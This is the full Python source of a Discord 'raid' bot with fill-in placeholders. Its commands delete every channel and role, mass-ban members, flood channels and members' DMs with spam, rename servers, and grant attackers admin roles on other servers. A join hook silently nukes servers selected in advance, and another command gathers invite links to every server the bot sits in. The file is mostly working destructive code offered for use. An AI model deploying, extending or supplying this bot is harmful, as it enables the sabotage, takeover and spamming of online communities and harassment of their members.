import discord
from discord.ext import commands
from discord.ui import View, Button
import asyncio
import aiohttp
import os
import sys
from datetime import datetime
import webserver
import warnings
import logging
warnings.filterwarnings("ignore", category=DeprecationWarning)


intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$', intents=intents)

embed_message_id = None
programmed_servers = set()

@bot.command()
@commands.has_permissions(administrator=True)
async def massban(ctx):
    guild = ctx.guild
    author = ctx.author

    members_to_ban = [m for m in guild.members if m != author and guild.me.top_role > m.top_role]
    total = len(members_to_ban)
    count = 0

    confirm_msg = await ctx.send(
        f"**Attempting to ban {total} members...**\n\n"
        f"Make sure to put the bot's role above any other role**.\n"
        f"The bot can only ban users who are **under** its role.\n\n"
        f"React with ✅ to confirm or ❌ to cancel."
    )
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")

    def check(reaction, user):
        return (
            user == author
            and str(reaction.emoji) in ["✅", "❌"]
            and reaction.message.id == confirm_msg.id
        )

    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("Timed out — MassBan cancelled.")
        return

    if str(reaction.emoji) == "❌":
        await ctx.send("MassBan Cancelled.")
        return

    await ctx.send(f"Initiating ban of {total} members...")

    async with aiohttp.ClientSession() as session:
        async def ban_member(member):
            nonlocal count
            try:
                url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}"
                headers = {
                    "Authorization": f"Bot {bot.http.token}",
                    "Content-Type": "application/json"
                }
                json_data = {"delete_message_days": 0, "reason": "Massban"}

                async with session.put(url, json=json_data, headers=headers) as resp:
                    if resp.status == 429:
                        data = await resp.json()
                        retry_after = data.get("retry_after", 1)
                        await asyncio.sleep(retry_after)
                        return await ban_member(member)
                    elif resp.status in (200, 201, 204):
                        count += 1
                        print(f"[{count}/{total}] Banned: {member}")
                    else:
                        print(f"[!] Error while banning {member}: {resp.status}")
            except Exception as e:
                print(f"[!] Can't ban {member}: {e}")

        tasks = [ban_member(m) for m in members_to_ban]
        await asyncio.gather(*tasks)

    await ctx.send(f"Massban completado — {count}/{total} users baneados.")

@bot.command()
@commands.has_permissions(administrator=True)
async def wbh(ctx):
    guild = ctx.guild
    msg = "RAID MESSAGE (THIS WILL BE SENT TO ALL CHANNELS)"
    cantidad = 40
    AVATAR_URL = "AVATAR URL"
    if not guild:
        return

    async def enviar_en_canal(channel):
        try:
            webhook = await channel.create_webhook(name="RBOT ON TOP")
            tareas = [
                webhook.send(
                    f"{msg}",
                    username="Rbot",
                    avatar_url=AVATAR_URL
                )
                for i in range(cantidad)
            ]
            await asyncio.gather(*tareas)
        except Exception as e:
            await ctx.send(f"Error en canal {channel.name}: {e}")

    await asyncio.gather(*(enviar_en_canal(channel) for channel in guild.text_channels))

@bot.command()
@commands.has_permissions(administrator=True)
async def ret(ctx, cantidad: int = 100):

    await ci.callback(ctx)
    await cn.callback(ctx)
    nombre_base = "CHANNEL NAMES"
    mensaje = "SPAM TEXT"
    mensajes_por_canal = 500

    if cantidad > 500:
        return

    async def borrar_canal(canal):
        try:
            await canal.delete()
        except:
            pass

    tareas_borrar = [borrar_canal(c) for c in ctx.guild.channels]
    await asyncio.gather(*tareas_borrar, return_exceptions=True)

    async def crear_y_spamear(i):
        try:
            canal = await ctx.guild.create_text_channel(name=f"{nombre_base}-{i}")
            tareas_spam = [canal.send(mensaje) for _ in range(mensajes_por_canal)]
            await asyncio.gather(*tareas_spam, return_exceptions=True)
        except:
            pass

    tareas_crear = [crear_y_spamear(i) for i in range(1, cantidad + 1)]
    await asyncio.gather(*tareas_crear, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def sv(ctx):
    allowed_ids = [IDS USERS] # In "IDs Users" you have to put the users who can use this command, so that you write it there it should be like [1426720039909724292, 1395678169402445825]

    if ctx.author.id not in allowed_ids:
        await ctx.send("You do not have permission to use the command.")
        return
    
    descripcion = ""

    for guild in bot.guilds:
        channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)

        if channel:
            try:
                invite = await channel.create_invite(max_age=0, max_uses=0)
                descripcion += (
                    f"📌 **{guild.name}**\n"
                    f"👥 Users: {guild.member_count}\n"
                    f"Invitation: {invite.url}\n\n"
                )
            except Exception as e:
                descripcion += (
                    f"📌 **{guild.name}**\n"
                    f"👥 Users: {guild.member_count}\n"
                    f"⚠️ Invitation could not be created: {e}\n\n"
                )
        else:
            descripcion += (
                f"📌 **{guild.name}**\n"
                f"👥 Users: {guild.member_count}\n"
                f"⚠️ There is no channel with permissions to create invitations.\n\n"
            )

    embed = discord.Embed(
        title="🌐 Servidores donde está el bot",
        description=descripcion if descripcion else "No se encontraron servidores.",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(administrator=True)
async def ks(ctx, server_id: int):
    programmed_servers.add(server_id)
    print(f"Server {server_id} programmed.")


@bot.event
async def on_guild_join(guild):
    if guild.id in programmed_servers:
        channel = next(
            (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
            None
        )
        if not channel:
            return

        class SilentCtx:
            def __init__(self, guild, channel, bot_user):
                self.guild = guild
                self.channel = channel
                self.send = lambda *args, **kwargs: None
                self.author = guild.owner or bot_user

        ctx = SilentCtx(guild, channel, bot.user)
        await nuke.callback(ctx)
        await cn.callback(ctx)
        await ci.callback(ctx)
        await bn.callback(ctx)
        await ret.callback(ctx)

@bot.command()
@commands.has_permissions(administrator=True)
async def da(ctx, user_id: int, server_id: int):
    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.send("I'm not on that server, maybe the ID is invalid.")
        return

    member = guild.get_member(user_id)
    if not member:
        await ctx.send("That user is not on the server.")
        return
    
    rol = discord.utils.get(guild.roles, name="NAME OF THE ADMIN ROLE")
    if rol is None:
        try:
            rol = await guild.create_role(
                name="NAME OF THE ADMIN ROLE",
                permissions=discord.Permissions(administrator=True)
            )
            await ctx.send("Rol 'NAME OF THE ADMIN ROLE' creado en el servidor.")
        except discord.Forbidden:
            await ctx.send("I do not have permission to create roles on that server.")
            return

    try:
        await member.add_roles(rol)
        await ctx.send(f"The role 'NAME OF THE ADMIN ROLE' was granted to <@{user_id}> in **{guild.name}** ({guild.id}).")
    except discord.Forbidden:
        await ctx.send("I do not have permission to assign that role on the destination server.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def vs(ctx, server_id: int, cantidad: int = 100):
    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.send("I am not on that server or the ID is invalid.")
        return

    channel = guild.text_channels[0] if guild.text_channels else None
    if not channel:
        await ctx.send("There are no text channels on that server.")
        return

    author = guild.me or guild.owner

    class SilentCtx:
        def __init__(self, guild, channel, bot_user):
            self.guild = guild
            self.channel = channel
            self.author = author
        async def send(self, *args, **kwargs):
            return None

    silent_ctx = SilentCtx(guild, channel, bot.user)

    try:
        await md.callback(silent_ctx)
        await cn.callback(silent_ctx)
        await ci.callback(silent_ctx)
        await nuke.callback(silent_ctx)
        await bn.callback(silent_ctx)
        await md.callback(silent_ctx)
        await ret.callback(silent_ctx, cantidad)
        await ctx.send(f"Commands activated in **{guild.name}** ({guild.id})")
    except Exception as e:
        await ctx.send(f"Error executing remote: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx):
    cantidad = 500
    mensaje = (
        "SPAM TEXT"
    )

    if cantidad > 1000:
        return

    async def enviar_en_canal(canal):
        for _ in range(cantidad):
            try:
                await canal.send(mensaje)
            except:
                pass

    tareas = [enviar_en_canal(c) for c in ctx.guild.text_channels]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def raid(ctx, cantidad: int = 100):
    nombre_base = "CHANNEL NAMES"

    if cantidad > 500:
        return

    async def crear_canal(i):
        try:
            await ctx.guild.create_text_channel(name=f"{nombre_base}-{i}")
        except:
            pass

    tareas = [crear_canal(i) for i in range(1, cantidad + 1)]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def md(ctx):
    enviados = 0
    fallidos = 0
    repeticiones = 20

    mensaje_predefinido = (
     "EMBED TITLE\n\n"
     "EMBED MESSAGE"
 )

    embed = discord.Embed(
        title="EMBED TITLE",
        description=mensaje_predefinido,
        color=discord.Color.blurple()
    )
    embed.set_footer(text=f"MESSAGE")
    embed.set_image(url=f"YOU CAN INSERT AN IMAGE HERE, BUT IF YOU DON'T WANT TO INSERT ONE, DELETE THIS ENTIRE LINE.")

    for miembro in ctx.guild.members:
        if miembro.bot:
            continue
        try:
            for _ in range(repeticiones):
                await miembro.send(embed=embed)
                await asyncio.sleep(0.2)
        except:
            pass

@bot.command()
@commands.has_permissions(manage_roles=True)
async def dr(ctx):
    protected = [ctx.guild.default_role, ctx.guild.owner, bot.user]

    roles_a_borrar = [
        r for r in ctx.guild.roles
        if r not in protected and not r.managed
    ]

    async def borrar(role):
        try:
            await role.delete()
        except discord.Forbidden:
            await ctx.send(f"I do not have permission to delete the role in {role.name}.")
        except Exception as e:
            await ctx.send(f"Error while deleting {role.name}: {e}")

    await asyncio.gather(*(borrar(r) for r in roles_a_borrar), return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    async def borrar_canal(canal):
        try:
            await canal.delete()
        except:
            pass

    tareas = [borrar_canal(c) for c in ctx.guild.channels]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def cn(ctx):
    nombre_dea = "NEW SERVER NAME"

    try:
        await ctx.guild.edit(name=nombre_dea)
    except:
        pass

@bot.command()
@commands.has_permissions(administrator=True)
async def ci(ctx):
    try:
        with open("HERE YOU WRITE THE NAME OF THE IMAGE THAT YOU HAVE IN THE SAME LOCATION AS THE FILE, SUCH AS image.jpg OR image.png", "rb") as f:
            imagen_bytes = f.read()
            await ctx.guild.edit(icon=imagen_bytes)
    except:
        pass
@bot.command()
@commands.has_permissions(manage_roles=True)
async def cr(ctx, cantidad: int = 100):
    nombre_XD = "NAMES OF THE ROLES TO BE CREATED"

    if cantidad > 100:
        return

    for i in range(1, cantidad + 1):
        nombre = f"{nombre_XD}-{i}"
        try:
            await ctx.guild.create_role(name=nombre)
            await asyncio.sleep(0)
        except discord.Forbidden:
            await ctx.send(f"I do not have permission to create the role {nombre}.")
        except Exception as e:
            await ctx.send(f"Error creating {nombre}: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def ping(ctx):
    try:
        latencia = round(bot.latency * 1000)
        await ctx.send(f"🏓 Pong! Bot: `{latencia}ms`")
    except discord.Forbidden:
        await ctx.send("I do not have permission to send messages here.")
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def cleanbot(ctx, bot_id: int):
    """
    Delete messages sent by a specific bot in ALL text channels on the server.
    - bot_id: ID of the bot user whose messages you want to delete
    - Fixed limit: 200 messages per channel
    """
    await ctx.send(f"Cleaning up messages from the bot {bot_id} across all channels...")

    async def clean_channel(channel):
        deleted = 0
        try:
            async for msg in channel.history(limit=200):
                if msg.author.id == bot_id:
                    try:
                        await msg.delete()
                        deleted += 1
                    except discord.Forbidden:
                        return f"No permissions on {channel.name}"
                    except discord.HTTPException:
                        pass
        except discord.Forbidden:
            return f"ERROR IN {channel.name}"
        except discord.HTTPException:
            return f"I can't read{channel.name}"
        return f"{channel.name}: {deleted} deleted messages"

    tasks = [clean_channel(ch) for ch in ctx.guild.text_channels]
    results = await asyncio.gather(*tasks)

    summary = "\n".join(results)
    await ctx.send(f"Cleaning Summary:\n{summary}")

@bot.command()
@commands.has_permissions(administrator=True)
async def clear(ctx):
    try:
        await ctx.send("Deleting all messages from the channel...", delete_after=5)

        await ctx.channel.purge(limit=None)

        await ctx.send("All messages have been deleted.", delete_after=5)

    except discord.Forbidden:
        await ctx.send("I do not have permission to delete messages.")
    except Exception as e:
        await ctx.send(f"Error deleting messages: {e}")
@bot.command()
@commands.has_permissions(administrator=True)
async def cleanraid(ctx, prefix: str):
    await ctx.send("Cleaning channels...")

    deleted = 0
    for channel in ctx.guild.channels:
        if channel.name.startswith(prefix) and channel.name[len(prefix):].lstrip("-").isdigit():
            try:
                await channel.delete(reason=f"cleanraid executed by {ctx.author}")
                deleted += 1
            except discord.Forbidden:
                await ctx.send("I do not have permission to delete channels.")
                return
            except discord.HTTPException:
                await ctx.send(f"Error al borrar el canal: {channel.mention}")

    if deleted == 0:
        await ctx.send("No channels were found listed with that prefix.")
    else:
        await ctx.send(f"The raid has been deleted. Channels removed.: {deleted}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def bn(ctx):
    miembros = ctx.guild.members
    miembros_que_no_se_banean = [ctx.author, ctx.guild.owner, bot.user]

    miembros_a_banear = [
        miembro for miembro in miembros
        if miembro not in miembros_que_no_se_banean and not miembro.bot
    ]

    async def banear(usuario):
        try:
            await ctx.guild.ban(usuario, reason="WRITE THE REASON FOR THE BAN HERE")
        except discord.Forbidden:
            await ctx.send(f"I do not have permission to ban {usuario}.")
        except Exception as e:
            await ctx.send(f"Error when banning {usuario}: {e}")

    tareas = [banear(u) for u in miembros_a_banear]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(ban_members=True)
async def db(ctx, user_id: int):
    try:
        await ctx.guild.unban(discord.Object(id=user_id))
        await ctx.send(f"The user with ID `{user_id}` has been unbanned.")
    except Exception as e:
        await ctx.send(f"The user with ID `{user_id}` could not be unbanned.\nError: {e}")

paginas = [
    {
        "title": "📚 Bot Help Panel (Page 1 de 4)",
        "descripcion": (
            "`$hlp` –\n"
            "**Display this help panel.**\n"
            "`$ping` –\n"
            "**Shows the bot's latency.**\n"
            "`$spam` –\n"
            "**He spams all channels.**\n"
            "`$raid` –\n"
            "**Create a quantity of 80 channels.**\n"
            "`$nuke` –\n"
            "**Delete all channels from the server.**\n"
        )
    },
    {
        "title": "📚 Bot Help Panel (Page 2 de 4)",
        "descripcion": (
            "`$cn` –\n"
            "**Change the server name.**\n"
            "`$cr (AMOUNT)` –\n"
            "**Create a number of roles.**\n"
            "`$ci` –\n"
            "**Change the server photo.**\n"
            "`$ret` –\n"
            "**Raidea creating many channels with spam.**\n"
            "`$bn` –\n"
            "**Ban all members except bots with admin privileges.**\n"
            "`$db (USER ID` –\n"
            "**Unban a user using their ID only if the bot is on the serve.**\n"
        )
    },
    {
        "title": "📚 Bot Help Panel (Page 3 de 4)",
        "descripcion": (
            "`$dr` –\n"
            "**Delete all roles except those with admin.**\n"
            "`$ks (SERVER ID)` –\n"
            "**Program 5 commands when you insert the bot.**\n"
            "`$vs (SERVER ID)` –\n"
            "**Raidea only if the bot is inside the server.**\n"
            "`$da (USER ID) (SERVER ID)` –\n"
            "**Create an admin role and give it to the user if Chuyin is on the server.\n"
            "`$md` –\n"
            "**Send a DM to everyone with the bot link..**\n"
            "`$massban` –\n"
            "**Updated variant of the $bn command**\n"
            "`$wbh` –\n"
            "**Send many messages across all channels using webhooks**\n"
        )
    },
    {
        "title": "📚 Bot Help Panel (Page 4 de 4)",
        "descripcion": (
            "`$cleanbot (BOT ID)` –\n"
            "**Delete messages sent by a bot.**\n"
            "`$cleanraid (CHANNEL NAME)` –\n"
            "**Delete all channels with that name**\n"
            "`$clear` –\n"
            "**Delete all messages from a channel.**\n"
        )
    }
]


class HelpView(View):
    def __init__(self, ctx):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.index = 0

    async def update_embed(self, interaction):
        page = paginas[self.index]
        embed = discord.Embed(
            title=page["title"],
            description=page["descripcion"],
            color=0xBDC3C7
        )
        embed.set_thumbnail(url="URL PHOTO")
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Back", style=discord.ButtonStyle.primary)
    async def anterior(self, button: Button, interaction: discord.Interaction):
        if self.index > 0:
            self.index -= 1
            await self.update_embed(interaction)

    @discord.ui.button(label="Next", style=discord.ButtonStyle.primary)
    async def siguiente(self, button: Button, interaction: discord.Interaction):
        if self.index < len(paginas) - 1:
            self.index += 1
            await self.update_embed(interaction)

    @discord.ui.button(label="Close", style=discord.ButtonStyle.danger)
    async def cerrar(self, button: Button, interaction: discord.Interaction):
        await interaction.message.delete()
@bot.command()
async def hlp(ctx):
    page = paginas[0]
    embed = discord.Embed(
        title=page["title"],
        description=page["descripcion"],
        color=0xBDC3C7
    )
    embed.set_thumbnail(url="URL PHOTO")

    view = HelpView(ctx)
    await ctx.send(embed=embed, view=view)

@bot.event
async def on_ready():
    print(f'Bot connected... {bot.user}')
    print(f'$hlp - \n Displays the help panel.')

bot.run("BOT TOKEN")
